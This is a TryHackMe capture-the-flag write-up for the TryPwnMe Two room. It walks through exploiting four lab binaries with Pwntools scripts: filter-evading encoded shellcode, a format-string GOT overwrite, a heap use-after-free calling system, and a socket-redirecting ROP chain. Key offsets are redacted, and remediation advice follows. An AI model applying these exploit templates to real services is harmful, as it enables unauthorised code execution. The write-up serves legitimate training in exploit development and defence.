# TryPwnMe Two Challenge

![Banner](./../IMAGES/trypwnme_two_img.png?raw=true)

**Category:** *Standalone Challenge* | **Section:** *TryHackMe Challenges* | **Challenge:** *[TryPwnMe Two](https://tryhackme.com/room/trypwnmetwo)*

> [!IMPORTANT]
>
> **Working write-up notice:** This was a working and verified write-up at the time of writing on **28 July 2026**.
>
> **Spoiler warning:** This write-up documents the complete exploitation process for all four binaries. Exact flags, sensitive runtime addresses, challenge-specific offsets and other direct answer material have been redacted.
>
> **Please note:** The target IP address was dynamically allocated by TryHackMe. The assessment was performed from my own Kali Linux VM using OpenVPN to connect to the TryHackMe VPN.
>
> The following placeholders are used throughout:
>
> - `<TARGET_IP>` represents the IP address allocated to the target machine.
> - `<TUN0_IP>` represents the IP address assigned to the Kali Linux `tun0` interface.
> - `<REDACTED>` represents sensitive addresses, offsets, runtime values, exploit-specific constants or other direct challenge giveaways.
> - `THM{....}` represents a redacted TryHackMe flag.
>
> **Licence:** Unless otherwise stated, all write-ups and documentation in this repository are licensed under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/). Any original scripts or code snippets are provided under the [MIT Licence](https://opensource.org/license/mit/).

## About TryHackMe

This write-up was made possible by the hard work of the TryHackMe team and the wider cyber security community, who continue to create practical and engaging environments for learning offensive and defensive security.

[TryHackMe](https://tryhackme.com/) is an online cyber security training platform providing hands-on laboratories covering penetration testing, networking, web application security, exploit development, privilege escalation, Active Directory and defensive security.

TryPwnMe Two continues the binary exploitation series with four intermediate challenges covering shellcode filtering, format-string exploitation, heap internals and return-oriented programming.

## Lab Summary

TryPwnMe Two is an exploit-development challenge hosted within a controlled TryHackMe environment. Each task provides a local copy of the relevant binary and a corresponding remote service. The objective is to analyse each program, develop a reliable exploit and read `flag.txt` from the remote target.

The successful attack chain involved:

1. Confirming VPN connectivity, routing and local hostname resolution.
2. Reviewing the four supplied challenge directories and binaries.
3. Bypassing a shellcode filter with encoded amd64 shellcode.
4. Exploiting a format-string vulnerability to leak libc and overwrite a writable GOT entry.
5. Exploiting a heap use-after-free to leak libc and call `system("/bin/sh")`.
6. Leaking the PIE base of a custom web server through a format string.
7. Exploiting a stack overflow with a ROP chain using `dup2()` and `execve()`.
8. Reading four flags in the same order in which they were discovered.

Confirmed lab details used during the walkthrough:

```text
Target IP: <TARGET_IP>
Kali tun0 IP: <TUN0_IP>
Attacker working directory: /tmp/VK/
Task files: /tmp/VK/materials-trypwnmetwo
Local hostname: trypwnme-two.thm
```

The target was added to the local hosts file:

```bash
echo "<TARGET_IP> trypwnme-two.thm" | sudo tee -a /etc/hosts
```

The mapping was confirmed using:

```bash
getent hosts trypwnme-two.thm
```

VPN routing and the tunnel address were checked with:

```bash
ip route get <TARGET_IP>
ip -br address show tun0
```

The expected route showed traffic leaving through `tun0` and using `<TUN0_IP>` as the source address.

Connectivity was then confirmed:

```bash
ping -c 6 trypwnme-two.thm
```

> [!TIP]
>
> When using a personal Kali Linux VM, `/etc/hosts` is especially important for TryHackMe challenges. Some rooms rely on hostnames for routing, virtual hosts, redirects, certificates, cookies or application logic. Accessing only the IP address can therefore produce misleading errors or incomplete behaviour.
>
> Over time, `/etc/hosts` can become cluttered with entries left behind by earlier rooms. It is advantageous to keep the file clear, tidy and focused on the challenge currently being worked on.
>
> A hosts file containing months of abandoned lab entries eventually becomes DNS archaeology - fascinating, but not especially helpful during troubleshooting.

The file can be reviewed with:

```bash
cat /etc/hosts
```

An old entry for this room can be removed with:

```bash
sudo sed -i '/trypwnme-two\.thm/d' /etc/hosts
```

The currently allocated target can then be added again using `<TARGET_IP>`.

The supplied task files were organised as follows:

```text
materials-trypwnmetwo/
├── NotSpecified2/
│   ├── ld-linux-x86-64.so.2
│   ├── libc.so.6
│   └── notspecified2
├── SlowServer/
│   ├── index.html
│   └── slowserver
├── TryaNote/
│   ├── ld-2.35.so
│   ├── libc.so.6
│   └── tryanote
└── TryExecMe2/
    └── tryexecme2
```

## Tools Used

The principal tools and utilities used during the challenge were:

- `file` for identifying ELF architecture, linking and symbol information.
- `checksec` for reviewing RELRO, stack canaries, NX and PIE.
- `nm` for listing symbols in non-stripped binaries.
- `objdump` for static disassembly in Intel syntax.
- `strings` for identifying embedded request methods and useful text.
- GDB-compatible exploit-development concepts for understanding stack, heap and control flow.
- Python 3 and [Pwntools](https://docs.pwntools.com/) for shellcode generation, ELF parsing, payload construction and remote interaction.
- `nc` for manually probing the custom web server.
- Standard Linux utilities including `ls`, `cat`, `grep`, `printf`, `chmod` and `nano`.

Click [HERE](https://github.com/Valikahn/TryHackMe-Standalone-Challenge#tools-commonly-used) to return to the repository README. The `Tools Commonly Used` section contains links to tools used throughout the pathway.

## Initial Enumeration

### Connectivity and Task Files

The target hostname resolved correctly through `/etc/hosts`, the target was reachable over the VPN and the route used the expected `tun0` interface.

The challenge files were enumerated with:

```bash
cd /tmp/VK/
ls -lah
ls -R materials-trypwnmetwo
```

Each task directory contained the binary required for local analysis. Two challenges also included the exact dynamic loader and libc used by the remote service, allowing offsets and symbol locations to be calculated against the correct library build.

### Challenge 1 - TryExecMe2

The first binary was identified with:

```bash
file /tmp/VK/materials-trypwnmetwo/TryExecMe2/tryexecme2
checksec --file=/tmp/VK/materials-trypwnmetwo/TryExecMe2/tryexecme2
```

The relevant properties were:

```text
Architecture: amd64
PIE: enabled
NX: enabled
Stack canary: absent
RELRO: full
Symbols: present
```

Because the binary was not stripped, its symbols were listed with:

```bash
nm -C /tmp/VK/materials-trypwnmetwo/TryExecMe2/tryexecme2
```

Useful functions included:

```text
banner
setup
forbidden
main
```

The filter routine was disassembled with:

```bash
objdump -d -M intel \
  --disassemble=forbidden \
  /tmp/VK/materials-trypwnmetwo/TryExecMe2/tryexecme2
```

The disassembly showed that the program scanned the supplied bytes and rejected three common system-call instruction sequences:

```text
0f 05    syscall
0f 34    sysenter
cd 80    int 0x80
```

The `main()` function was then inspected:

```bash
objdump -d -M intel \
  --disassemble=main \
  /tmp/VK/materials-trypwnmetwo/TryExecMe2/tryexecme2
```

The program used `mmap()` to create a readable, writable and executable memory region, read up to 128 bytes into it, passed the buffer through `forbidden()` and then called the buffer directly.

This established that the task was not a conventional stack overflow. The intended route was to supply shellcode that did not contain the forbidden byte patterns at inspection time.

### Challenge 2 - NotSpecified2

The second binary was reviewed with:

```bash
cd /tmp/VK/materials-trypwnmetwo/NotSpecified2
file notspecified2
checksec --file=notspecified2
```

The most important protections were:

```text
Partial RELRO
No stack canary
NX enabled
No PIE
```

Partial RELRO meant that relevant Global Offset Table entries remained writable, while No PIE meant the binary's own addresses stayed fixed.

The vulnerable control flow was confirmed with:

```bash
objdump -d -M intel --disassemble=main notspecified2
```

The program read attacker-controlled input and passed it directly to `printf()` as the format string:

```c
printf(user_input);
```

It then called `exit()`. The writable GOT address for that function was located with:

```bash
objdump -R notspecified2 | grep exit
```

The exact address is intentionally redacted:

```text
exit@GOT: <REDACTED>
main: <REDACTED>
```

A local format-string probe established where the supplied bytes appeared in the variadic argument list:

```bash
python3 - <<'PY'
from pwn import *

p = process([
    "./ld-linux-x86-64.so.2",
    "--library-path", ".",
    "./notspecified2"
])

p.sendline(b"AAAABBBB." + b".%p" * 20)
print(p.recvall(timeout=2).decode(errors="replace"))
PY
```

The marker appeared at argument position `<REDACTED>`. The probe also exposed a libc pointer suitable for calculating the remote libc base.

### Challenge 3 - TryaNote

The third binary was checked with:

```bash
cd /tmp/VK/materials-trypwnmetwo/TryaNote
file tryanote
checksec --file=tryanote
```

Its protections were stronger:

```text
Full RELRO
Stack canary present
NX enabled
PIE enabled
```

Defined functions were listed with:

```bash
nm -C tryanote | grep ' T '
```

The note application exposed the following relevant routines:

```text
create
show
update
delete
win
main
```

The `win()` function was inspected first:

```bash
objdump -d -M intel --disassemble=win tryanote
```

The function selected a note, treated the first eight bytes of that note as a function pointer and called it with a separately supplied value as its argument. This created a powerful call primitive once an attacker-controlled function address could be placed in a note.

The deletion routine was then inspected:

```bash
objdump -d -M intel --disassemble=delete tryanote
```

It freed the selected heap allocation but did not clear the corresponding pointer in the global `chunks[]` array. This left a dangling pointer and created a use-after-free condition.

The allocation logic was confirmed with:

```bash
objdump -d -M intel --disassemble=create tryanote
```

The program accepted allocations up to `0x1000` bytes, stored pointers globally and read content directly into each allocated chunk.

### Challenge 4 - SlowServer

The final binary was identified with:

```bash
cd /tmp/VK/materials-trypwnmetwo/SlowServer
file slowserver
checksec --file=slowserver
```

The relevant properties were:

```text
Full RELRO
No stack canary
NX enabled
PIE enabled
```

Symbols were listed with:

```bash
nm -C slowserver | grep ' T '
```

Useful handlers included:

```text
handle_get_request
handle_post_request
handle_debug_request
handle_request
__security_Check
main
```

The debug handler was disassembled with:

```bash
objdump -d -M intel --disassemble=handle_debug_request slowserver
```

The function copied attacker-controlled data into a stack buffer using `sprintf()` and supplied that data as the format string. This introduced a format-string vulnerability.

The main request parser was then inspected:

```bash
objdump -d -M intel --disassemble=handle_request slowserver
```

The custom server parsed the request method and routed requests to separate GET, POST and DEBUG handlers. Embedded strings confirmed the non-standard method:

```bash
strings -tx slowserver | grep -E 'GET|POST|DEBUG'
```

The debug endpoint was tested manually with Netcat. The shell's own `printf` format processing had to be avoided by using a literal `%s` wrapper:

```bash
printf '%s' 'DEBUG AAAA.%p.%p.%p.%p.%p.%p.%p.%p HTTP/1.1\r\n\r\n' \
  | nc trypwnme-two.thm 5555
```

A targeted positional leak then exposed a return address inside the PIE binary:

```bash
printf '%s' 'DEBUG %<REDACTED>$p HTTP/1.1\r\n\r\n' \
  | nc trypwnme-two.thm 5555
```

The leaked return address was used to calculate the PIE base by subtracting the known static offset:

```text
PIE base = leaked runtime address - <REDACTED>
```

## Exploits

### Challenge 1 - Encoded Shellcode Bypass

The first service listened on port `5002`.

The raw amd64 `/bin/sh` shellcode generated by Pwntools normally contains the `syscall` instruction bytes `0f 05`. Sending it directly would therefore trigger the filter.

Pwntools' encoder was used to transform the shellcode so the forbidden bytes were not present in the payload submitted to the checker. The decoder stub reconstructed the original shellcode only after execution began inside the writable and executable mapping.

The exploit was created as follows:

```python
#!/usr/bin/env python3

from pwn import *

context.arch = "amd64"
context.os = "linux"

shellcode = shellcraft.amd64.linux.sh()
encoded = encode(
    asm(shellcode),
    avoid=b"\x0f\xcd"
)

io = remote("trypwnme-two.thm", 5002)
io.send(encoded)
io.interactive()
```

The script was executed with:

```bash
python3 solve.py
```

The remote service accepted the encoded payload and returned an interactive shell:

```text
Give me your spell, and I will execute it:
Executing Spell...
$ ls
flag.txt
run
```

The first flag was collected with:

```bash
cat flag.txt
```

```text
1. TryExecMe2 flag: THM{....}
```

#### How the Encoding Worked

The payload was not cryptographically encrypted. It was encoded to avoid specific byte values. Pwntools prepended a decoder stub and transformed the shellcode data so that the prohibited bytes were absent when `forbidden()` scanned the buffer.

Once execution reached the payload, the decoder reconstructed the original `/bin/sh` shellcode in the writable executable memory region. The restored shellcode could then execute the required system call normally.

This distinction matters: the filter inspected the payload only before execution and did not validate the modified memory afterwards.

### Challenge 2 - Format String, GOT Loop and One-Gadget

The second service listened on port `5000`.

The exploit used two stages:

1. Leak a libc address and overwrite `exit@GOT` so execution returned to `main()`.
2. Use the second pass through the vulnerable `printf()` to overwrite `exit@GOT` with a suitable libc execution target.

The local ELF and supplied libc were loaded with Pwntools so symbol and GOT addresses could be resolved against the exact challenge files.

The exploit structure was:

```python
#!/usr/bin/env python3

from pwn import *

context.update(os="linux", arch="amd64", log_level="error")
context.binary = binary = ELF("./notspecified2", checksec=False)

r = remote("trypwnme-two.thm", 5000)

# Stage 1: leak libc and redirect exit() back to main().
payload = b"%<REDACTED>$pBBBB"
payload += b"<REDACTED>".ljust(<REDACTED>, b"A")
payload += p64(binary.got["exit"])
payload += p64(binary.got["exit"] + 1)

r.recvuntil(b"Please provide your username:\n")
r.sendline(payload)

libc_leak = int(
    r.recvuntil(b"BBBB").split(b" ")[1][:-4],
    16
)
libc_base = libc_leak - <REDACTED>

# Stage 2: overwrite exit@GOT with the selected libc target.
payload = fmtstr_payload(
    <REDACTED>,
    {binary.got["exit"]: libc_base + <REDACTED>}
)

r.recvuntil(b"Please provide your username:\n")
r.sendline(payload)
r.recv()
r.interactive()
```

> [!NOTE]
>
> The exact format-string widths, argument index, libc subtraction and final libc offset have been redacted because they directly disclose the challenge solution. They can be derived from the supplied binary and libc using the enumeration steps shown above.

The first overwrite changed only the necessary bytes of `exit@GOT`, redirecting the call back to `main()` and granting a second controlled format-string operation.

The libc leak was converted into the library base with:

```text
libc base = leaked libc address - known symbol/return offset
```

The second payload used `fmtstr_payload()` to write the calculated execution target into `exit@GOT`. When the program called `exit()` again, control transferred into libc and produced a shell.

The second flag was then collected:

```text
$ ls
flag.txt
ld-linux-x86-64.so.2
libc.so.6
run
$ cat flag.txt
THM{....}
```

```text
2. NotSpecified2 flag: THM{....}
```

### Challenge 3 - Unsorted-Bin Leak and Use-After-Free

The third service listened on port `5001`.

The exploit relied on the dangling pointer left by `delete()`.

Two large notes were allocated. The first was freed while the second remained allocated, preventing the freed region from merging directly with the top chunk. The freed allocation entered the unsorted bin and its user-visible data area contained allocator pointers into libc.

The stale pointer was then displayed, leaking a libc address. The remote libc base was calculated by subtracting the known unsorted-bin offset from the leak.

A new note was created containing the resolved address of `system()`. The hidden `win()` action then treated the note contents as a function pointer and invoked it with the address of `/bin/sh` as its argument.

The exploit structure was:

```python
#!/usr/bin/env python3

from pwn import *

context.update(os="linux", arch="amd64", log_level="error")
libc = ELF("./libc.so.6", checksec=False)

r = remote("trypwnme-two.thm", 5001)

def create(size, content):
    r.sendlineafter(b"\n>>", b"1")
    r.sendlineafter(b"Enter entry size:\n", str(size).encode())
    r.sendlineafter(b"Enter entry data:\n", content)

def show(index):
    r.sendlineafter(b"\n>>", b"2")
    r.sendlineafter(b"Enter entry index:\n", str(index).encode())

def delete(index):
    r.sendlineafter(b"\n>>", b"4")
    r.sendlineafter(b"Enter entry index:\n", str(index).encode())

def win(index, content):
    r.sendlineafter(b"\n>>", b"5")
    r.sendlineafter(b"Enter the index:", str(index).encode())
    r.sendlineafter(b"Enter the data:", content.encode())

create(0x1000, b"A")
create(0x1000, b"B")
delete(0)

show(0)
libc.address = (
    u64(r.recvline().rstrip().ljust(8, b"\x00"))
    - <REDACTED>
)

create(<REDACTED>, p64(libc.sym["system"]))
win(<REDACTED>, str(next(libc.search(b"/bin/sh"))))

r.recv()
r.interactive()
```

The exploit returned a shell and the third flag was read:

```text
$ ls
flag.txt
ld-2.35.so
libc.so.6
run
$ cat flag.txt
THM{....}
```

```text
3. TryaNote flag: THM{....}
```

#### Understanding the Leak

This stage did not decode an encoded value. Instead, the leaked bytes were interpreted as a little-endian 64-bit address:

```python
u64(leaked_bytes.ljust(8, b"\x00"))
```

The leak was shorter than eight bytes because canonical userspace addresses contain leading zero bytes. Padding restored the value to eight bytes before `u64()` converted it into an integer.

The libc base was then derived by subtraction:

```text
libc base = unsorted-bin leak - known allocator offset
```

### Challenge 4 - PIE Leak and ROP Shell

The final service listened on port `5555`.

The custom `DEBUG` method exposed a format-string vulnerability that leaked a return address from inside the PIE binary. The binary base was calculated by subtracting the matching static offset.

```text
PIE base = leaked address - <REDACTED>
```

Once the PIE base was known, the required ROP gadgets could be calculated by adding their static offsets to the base:

```text
gadget runtime address = PIE base + gadget offset
```

The `POST` request path contained the stack overflow used to gain control of the saved return address. The final ROP chain performed:

```text
dup2(client_socket, STDIN_FILENO)
dup2(client_socket, STDOUT_FILENO)
execve("/bin/sh", NULL, NULL)
```

Redirecting the socket was essential. Without the `dup2()` calls, the shell could execute but its input and output would not be connected to the attacker's network session.

The exploit structure was:

```python
#!/usr/bin/env python3

from pwn import *

context.update(os="linux", arch="amd64", log_level="error")

remote_addr = "trypwnme-two.thm"

# Leak the PIE base through the DEBUG format string.
r1 = remote(remote_addr, 5555)
r1.sendline(b"DEBUG %<REDACTED>$p \n")
leak = int(r1.recv().strip(), 16)
binary_base = leak - <REDACTED>
r1.close()

# Resolve ROP gadgets from the PIE base.
pop_rax = binary_base + <REDACTED>
pop_rdi_xor_rdi_rbp = binary_base + <REDACTED>
pop_rsi = binary_base + <REDACTED>
pop_rdx_pop_r12 = binary_base + <REDACTED>
push_rbp_mov_rbp_rsp_pop_rax = binary_base + <REDACTED>
syscall = binary_base + <REDACTED>

execve = 59
dup2 = 33

payload = b"POST "
payload += b"A" * <REDACTED>
payload += b"/bin/sh\x00"

# dup2(socket, 0)
payload += p64(pop_rdi_xor_rdi_rbp)
payload += b"<REDACTED>"
payload += p64(pop_rax)
payload += p64(dup2)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(syscall)

# dup2(socket, 1)
payload += p64(pop_rdi_xor_rdi_rbp)
payload += b"<REDACTED>"
payload += p64(pop_rax)
payload += p64(dup2)
payload += p64(pop_rsi)
payload += p64(1)
payload += p64(syscall)

# execve("/bin/sh", NULL, NULL)
payload += p64(push_rbp_mov_rbp_rsp_pop_rax)
payload += p64(pop_rdi_xor_rdi_rbp)
payload += p64(0)
payload += p64(pop_rax)
payload += p64(execve)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(pop_rdx_pop_r12)
payload += p64(0)
payload += p64(0)
payload += p64(syscall)

payload += b" \n"

r2 = remote(remote_addr, 5555)
r2.sendline(payload)
r2.sendline(b"")
r2.interactive()
```

> [!NOTE]
>
> The exact positional format specifier, stack offset, socket-register preparation and gadget offsets have been redacted. They are challenge-specific values that directly complete the exploit when copied unchanged.

The exploit returned an interactive shell through the original client socket:

```text
$ ls
Dockerfile
flag.txt
index.html
slowserver
$ cat flag.txt
THM{....}
```

```text
4. SlowServer flag: THM{....}
```

## Full Attack Chain Recap

### 1. VPN and Hostname Preparation
The dynamically allocated target and Kali `tun0` addresses were confirmed before analysis. The hostname `trypwnme-two.thm` was mapped to `<TARGET_IP>` in `/etc/hosts`, ensuring consistent resolution throughout all four remote exploits.

### 2. Local Binary Review
The supplied task files were separated into four directories. `file`, `checksec`, `nm`, `objdump` and `strings` were used to establish architecture, mitigations, symbols and vulnerable control flow before any remote payload was attempted.

### 3. TryExecMe2 Filter Analysis
The first binary created an RWX mapping, read attacker-controlled bytes and executed them. A validation function rejected `syscall`, `sysenter` and `int 0x80` byte sequences before execution.

### 4. Encoded Shellcode Execution
Pwntools generated amd64 `/bin/sh` shellcode and encoded it to avoid the prohibited bytes. The decoder restored the shellcode after the validation stage, producing the first remote shell.

```text
Flag 1: THM{....}
```

### 5. NotSpecified2 Format-String Discovery
The second binary passed user input directly to `printf()`. No PIE provided stable binary addresses, while Partial RELRO left `exit@GOT` writable.

### 6. GOT Redirection and Libc Leak
A positional format string leaked a libc address. The first write redirected `exit()` back to `main()`, creating a second opportunity to exploit the same input path.

### 7. Libc Control Transfer
The libc base was calculated from the leak. A second format-string payload replaced `exit@GOT` with a suitable libc execution target, producing the second remote shell.

```text
Flag 2: THM{....}
```

### 8. TryaNote Use-After-Free
The note manager's `delete()` function freed heap allocations without clearing their global pointers. The stale pointer remained accessible through the application's other actions.

### 9. Unsorted-Bin Libc Leak
Two large chunks were allocated and the first was freed. Displaying the freed note exposed allocator metadata containing a libc pointer. The leak was padded, decoded as a little-endian 64-bit integer and converted into the libc base.

### 10. Function-Pointer Call Primitive
A new note was created with the address of `system()` as its first eight bytes. The `win()` function treated those bytes as a function pointer and called them with the address of `/bin/sh`, returning the third remote shell.

```text
Flag 3: THM{....}
```

### 11. SlowServer DEBUG Leak
The custom web server's `DEBUG` method supplied attacker-controlled input to `sprintf()` as a format string. A positional `%p` leak disclosed a return address inside the PIE binary.

### 12. PIE Base and Gadget Resolution
The known static return offset was subtracted from the leaked address to recover the PIE base. Required ROP gadget addresses were then calculated relative to that base.

### 13. POST Stack Overflow
The `POST` handler allowed control of the saved return address. A ROP chain redirected the network socket onto standard input and output with `dup2()` before invoking `execve("/bin/sh", NULL, NULL)`.

### 14. Final Shell and Flag
The ROP chain produced an interactive shell over the client connection. The final flag completed the room.

```text
Flag 4: THM{....}
```

## Key Lessons

TryPwnMe Two demonstrated several important exploit-development lessons:

- Confirm VPN routing, `tun0` addressing and hostname resolution before debugging exploit code.
- Keep `/etc/hosts` limited to mappings required by the active room.
- Use the challenge-supplied loader and libc when local behaviour must match the remote service.
- `checksec` does not identify the vulnerability, but it quickly narrows the viable exploitation strategies.
- Non-stripped binaries provide valuable function names that accelerate static analysis.
- Shellcode filtering based only on known byte sequences is fragile when memory remains writable and executable.
- Encoding can avoid prohibited bytes without changing the final behaviour of reconstructed shellcode.
- Passing user-controlled data directly as a format string can provide both information disclosure and arbitrary writes.
- Partial RELRO leaves GOT entries writable and can enable reliable control-flow redirection.
- Returning execution to `main()` is a useful way to turn a single vulnerable interaction into a multi-stage exploit.
- Libc leaks convert ASLR from an absolute defence into an address-calculation problem.
- Use-after-free vulnerabilities arise when freed pointers remain reachable by later program operations.
- Large freed chunks can expose allocator metadata and libc addresses through unsorted-bin pointers.
- A function-pointer primitive becomes critical when attacker-controlled data can supply both the called address and its argument.
- PIE requires a runtime leak before static gadget offsets can be converted into usable addresses.
- A shell launched by a network service may still be unusable unless its file descriptors are redirected to the client socket.
- ROP chains must respect register state, syscall conventions and stack alignment on amd64 Ubuntu targets.
- Public write-ups should explain the reasoning and methodology without publishing exact flags or copy-and-paste challenge answers.

The central lesson was that modern mitigations change the exploit route rather than automatically eliminating exploitation. Each binary required a different primitive: encoded execution, arbitrary format-string writes, a heap information leak and function-pointer call, or a PIE-aware ROP chain.

## Remediation Notes

### Shellcode Execution and Memory Permissions

- Never map attacker-controlled input as simultaneously readable, writable and executable.
- Apply W^X so memory cannot be writable and executable at the same time.
- Use NX-compatible designs that treat received data only as data.
- Apply seccomp filters where untrusted code execution is an intentional feature.
- Avoid blacklists of instruction byte sequences as a primary security control.
- Validate complete semantics rather than searching only for known opcodes.
- Remove direct calls into buffers populated from untrusted input.

### Format-String Security

- Never pass user-controlled input as the format parameter to `printf()`, `sprintf()` or related functions.
- Use explicit constant format strings:

```c
printf("%s", user_input);
```

- Replace unsafe `sprintf()` calls with bounded alternatives such as `snprintf()`.
- Enable compiler warnings including `-Wformat`, `-Wformat-security` and `-Werror=format-security`.
- Apply Full RELRO so GOT entries are made read-only after relocation.
- Retain PIE and ASLR, but do not treat them as substitutes for fixing the underlying flaw.

### Heap Object Lifetime

- Clear pointers immediately after freeing their allocations:

```c
free(chunks[index]);
chunks[index] = NULL;
sizes[index] = 0;
```

- Prevent operations on deleted objects.
- Track allocation state separately from user-controlled indexes.
- Reject duplicate deletion and stale object access.
- Use memory-safety testing tools such as AddressSanitizer during development.
- Fuzz create, update, show and delete sequences to expose lifetime errors.
- Avoid storing executable function pointers in user-controlled heap objects.

### Function-Pointer Safety

- Do not interpret untrusted object contents as callable addresses.
- Restrict callable operations to a fixed, validated dispatch table.
- Validate indexes and object state before indirect calls.
- Use Control-Flow Integrity where supported.
- Separate user data structures from internal callback metadata.

### Stack and Request Parsing

- Replace unbounded copies and formatting operations with length-checked equivalents.
- Validate request-line length before tokenisation or copying.
- Ensure every allocation includes space for its terminating null byte.
- Avoid writing a null terminator one byte beyond the allocated buffer.
- Reject oversized HTTP methods, paths and headers before processing.
- Apply stack canaries to all production builds.
- Use hardened compiler and linker options such as `-fstack-protector-strong`, PIE, Full RELRO and `_FORTIFY_SOURCE`.

### Information Disclosure

- Remove debug request methods from production services.
- Do not return raw pointers, stack contents or allocator data to clients.
- Ensure error handling does not expose process memory.
- Treat any address leak as a high-severity issue because it can defeat ASLR and PIE.
- Add tests that send format specifiers and malformed requests to every parsing path.

### Network-Service Design

- Use established, well-reviewed HTTP server libraries rather than implementing custom request parsing without a clear security requirement.
- Run services as an unprivileged, dedicated account.
- Apply container and operating-system sandboxing.
- Restrict filesystem access to only the files required by the service.
- Use seccomp, namespaces and mandatory access controls where appropriate.
- Monitor repeated malformed requests and unexpected custom methods.

### Operational Hygiene

- Keep `/etc/hosts` limited to the hostname mappings required by the current challenge.
- Remove stale TryHackMe entries after each room.
- Record the target IP, hostname and `tun0` address before beginning analysis.
- Keep each challenge in a separate working directory.
- Preserve supplied loaders and libraries alongside their matching binaries.
- Document discovered offsets and runtime calculations privately, then redact direct solution values before publishing.
- Validate every exploit locally where possible before connecting to the remote service.

## Disclaimer

This writeup is intended solely for education, training and documentation of an authorised TryHackMe lab.

All tools, commands, payloads and post-exploitation techniques described here were used within a controlled environment provided by TryHackMe. Permission to interact with the target was granted by the platform owner and operator as part of the room.

The tools and methods documented in this walkthrough represent one successful approach. They are not the only possible techniques, and alternative tools or workflows may produce the same result.

Never test, scan, exploit or access a system without clear and explicit authorisation from its owner.

---
[!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://buymeacoffee.com/v4l1k4hn)  

**Powered on ☕ made with ❤️ by [V4L1K4HN](https://tryhackme.com/p/V4L1K4HN)**  
⭐ If this project is useful, consider starring it on GitHub.
